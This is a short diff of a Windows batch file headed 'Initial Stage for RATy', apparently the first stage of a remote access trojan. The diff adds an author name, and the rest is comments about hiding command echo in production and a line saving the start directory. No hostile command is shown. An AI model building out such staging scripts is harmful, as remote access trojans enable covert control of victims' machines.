@@ -1,6 +1,6 @@
 @ REM -@echo off-           if i uncomment it, then the commands below wont show up printed on the cmd after running the -initial.cmd- file in cmd.  Its better to keep commented in Testing/Debugging Mode and uncomment it in Prod Mode
 @REM Initial Stage for RATy
-@REM Created By :
+@REM Created By : Muhammad Mohid Mughal
 
 @REM variables
 set "INITIALPATH=%cd%"    & @REM stores the initial path (in the variable) in which the user keeps the initially downloaded file, can be -Download- or -WP- or any other Folder
